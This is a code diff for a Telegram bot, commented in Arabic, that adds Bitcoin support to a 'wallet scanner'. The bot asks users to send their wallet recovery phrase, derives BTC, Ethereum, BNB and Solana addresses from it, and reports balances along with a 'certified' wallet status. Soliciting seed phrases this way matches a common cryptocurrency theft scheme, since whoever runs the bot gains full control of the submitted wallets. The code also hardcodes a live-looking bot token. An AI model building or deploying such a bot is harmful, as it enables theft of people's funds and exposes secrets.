@@ -4,6 +4,12 @@ const { ethers } = require('ethers');
 const bip39 = require('bip39');
 const { derivePath } = require('ed25519-hd-key');
 const { Keypair } = require('@solana/web3.js');
+const bitcoin = require('bitcoinjs-lib');
+const ecc = require('tiny-secp256k1');
+const { BIP32Factory } = require('bip32');
+
+bitcoin.initEccLib(ecc);
+const bip32 = BIP32Factory(ecc);
 
 const TOKEN = process.env.BOT_TOKEN || '9145894502:AAENaXWt47LwvKQUyOOCKu_rFdJkSXM9iu0';
 const PORT = process.env.PORT || 3000;
@@ -32,6 +38,12 @@ const SOLANA_RPCS = [
   'https://api.mainnet-beta.solana.com',
   'https://solana-rpc.publicnode.com',
   'https://rpc.ankr.com/solana'
+];
+
+// نقاط استعلام رصيد Bitcoin متعددة
+const BTC_APIS = [
+  'https://mempool.space/api/address/',
+  'https://blockstream.info/api/address/'
 ];
 
 // عقود USDT و USDC على Ethereum و BSC
@@ -89,10 +101,92 @@ function withTimeout(promise, ms = 3500, fallbackValue = null) {
   ]);
 }
 
+function deriveBitcoinAddresses(seedBuffer) {
+  const network = bitcoin.networks.bitcoin;
+  const root = bip32.fromSeed(seedBuffer, network);
+
+  // 1. Legacy (P2PKH - 1...)
+  const legacyChild = root.derivePath("m/44'/0'/0'/0/0");
+  const legacy = bitcoin.payments.p2pkh({ pubkey: legacyChild.publicKey, network }).address;
+
+  // 2. Nested SegWit (P2SH-P2WPKH - 3...)
+  const nestedChild = root.derivePath("m/49'/0'/0'/0/0");
+  const nestedSegwit = bitcoin.payments.p2sh({
+    redeem: bitcoin.payments.p2wpkh({ pubkey: nestedChild.publicKey, network }),
+    network
+  }).address;
+
+  // 3. Native SegWit (P2WPKH - bc1q...)
+  const nativeChild = root.derivePath("m/84'/0'/0'/0/0");
+  const nativeSegwit = bitcoin.payments.p2wpkh({ pubkey: nativeChild.publicKey, network }).address;
+
+  // 4. Taproot (P2TR - bc1p...)
+  const taprootChild = root.derivePath("m/86'/0'/0'/0/0");
+  const xOnlyPubkey = Buffer.from(taprootChild.publicKey.subarray(1, 33));
+  const taproot = bitcoin.payments.p2tr({ internalPubkey: xOnlyPubkey, network }).address;
+
+  return {
+    legacy,
+    nestedSegwit,
+    nativeSegwit,
+    taproot
+  };
+}
+
 function deriveSolanaAddress(seedBuffer) {
   const { key } = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
   const keypair = Keypair.fromSeed(key);
   return keypair.publicKey.toBase58();
+}
+
+async function fetchSingleBtcAddressSatoshis(btcAddress) {
+  for (const baseUrl of BTC_APIS) {
+    try {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), 2200);
+
+      const response = await fetch(`${baseUrl}${btcAddress}`, {
+        method: 'GET',
+        headers: { Accept: 'application/json' },
+        signal: controller.signal
+      });
+
+      clearTimeout(timer);
+      if (!response.ok) continue;
+
+      const data = await response.json();
+      const funded = BigInt(data?.chain_stats?.funded_txo_sum ?? 0);
+      const spent = BigInt(data?.chain_stats?.spent_txo_sum ?? 0);
+      const mempoolFunded = BigInt(data?.mempool_stats?.funded_txo_sum ?? 0);
+      const mempoolSpent = BigInt(data?.mempool_stats?.spent_txo_sum ?? 0);
+
+      const net = (funded - spent) + (mempoolFunded - mempoolSpent);
+      return net > 0n ? net : 0n;
+    } catch (_) {
+      // الانتقال للمزود التالي فوراً عند الفشل أو انتهاء المهلة
+    }
+  }
+  return 0n;
+}
+
+async function fetchCombinedBtcBalance(btcAddresses) {
+  const addresses = [
+    btcAddresses.legacy,
+    btcAddresses.nestedSegwit,
+    btcAddresses.nativeSegwit,
+    btcAddresses.taproot
+  ].filter(Boolean);
+
+  const satoshisList = await Promise.all(
+    addresses.map((addr) =>
+      withTimeout(fetchSingleBtcAddressSatoshis(addr), 3500, 0n)
+        .then((v) => v ?? 0n)
+        .catch(() => 0n)
+    )
+  );
+
+  const totalSatoshis = satoshisList.reduce((acc, val) => acc + val, 0n);
+  return ethers.formatUnits(totalSatoshis, 8);
 }
 
 async function fetchSolBalance(solAddress) {
@@ -151,7 +245,7 @@ bot.on('message', async (msg) => {
     return bot.sendMessage(
       chatId,
       '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
-      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص أرصدة ETH و BNB و SOL و USDT و USDC.',
+      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص أرصدة BTC و ETH و BNB و SOL و USDT و USDC.',
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
     );
   }
@@ -176,8 +270,9 @@ bot.on('message', async (msg) => {
     const evmWallet = hdNode.derivePath("m/44'/60'/0'/0/0");
     const evmAddress = evmWallet.address;
     const solAddress = deriveSolanaAddress(seed);
+    const btcAddresses = deriveBitcoinAddresses(seed);
 
-    const cacheKey = `${evmAddress}:${solAddress}`;
+    const cacheKey = `${btcAddresses.nativeSegwit}:${btcAddresses.taproot}:${evmAddress}:${solAddress}`;
     const cached = balanceCache.get(cacheKey);
 
     let balances;
@@ -186,6 +281,7 @@ bot.on('message', async (msg) => {
       balances = cached.data;
     } else {
       const [
+        btcAmount,
         ethWei,
         bscWei,
         solAmount,
@@ -194,6 +290,7 @@ bot.on('message', async (msg) => {
         bscUsdt,
         bscUsdc
       ] = await Promise.all([
+        withTimeout(fetchCombinedBtcBalance(btcAddresses), 4500, '0').then((v) => v ?? '0').catch(() => '0'),
         withTimeout(ethProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
         withTimeout(bscProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
         withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0),
@@ -204,6 +301,7 @@ bot.on('message', async (msg) => {
       ]);
 
       balances = {
+        btc: String(btcAmount),
         eth: ethers.formatEther(ethWei),
         bsc: ethers.formatEther(bscWei),
         sol: Number(solAmount),
@@ -223,16 +321,21 @@ bot.on('message', async (msg) => {
       chatId,
       'تم فحص المحفظة بنجاح ✅\n\n' +
       '📍 العناوين المشتقة:\n' +
-      '• EVM (ETH/BNB): `' + evmAddress + '`\n' +
+      '• BTC: `' + btcAddresses.nativeSegwit + '`\n' +
+      '• BTC: `' + btcAddresses.taproot + '`\n' +
+      '• BTC: `' + btcAddresses.nestedSegwit + '`\n' +
+      '• BTC: `' + btcAddresses.legacy + '`\n' +
+      '• EVM: `' + evmAddress + '`\n' +
       '• SOL: `' + solAddress + '`\n\n' +
       '💰 الأرصدة والأصول المكتشفة:\n' +
+      '• BTC: ' + balances.btc + '\n' +
       '• ETH: ' + balances.eth + '\n' +
       '• BNB: ' + balances.bsc + '\n' +
       '• SOL: ' + balances.sol + '\n' +
-      '• USDT (ETH): ' + balances.ethUsdt + '\n' +
-      '• USDC (ETH): ' + balances.ethUsdc + '\n' +
-      '• USDT (BSC): ' + balances.bscUsdt + '\n' +
-      '• USDC (BSC): ' + balances.bscUsdc + '\n' +
+      '• USDT: ' + balances.ethUsdt + '\n' +
+      '• USDC: ' + balances.ethUsdc + '\n' +
+      '• USDT: ' + balances.bscUsdt + '\n' +
+      '• USDC: ' + balances.bscUsdc + '\n' +
       '• Crypto actifs: `$0.00`\n\n' +
       '🟢 حالة المحفظة نشطة ومعتمدة نظامياً',
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
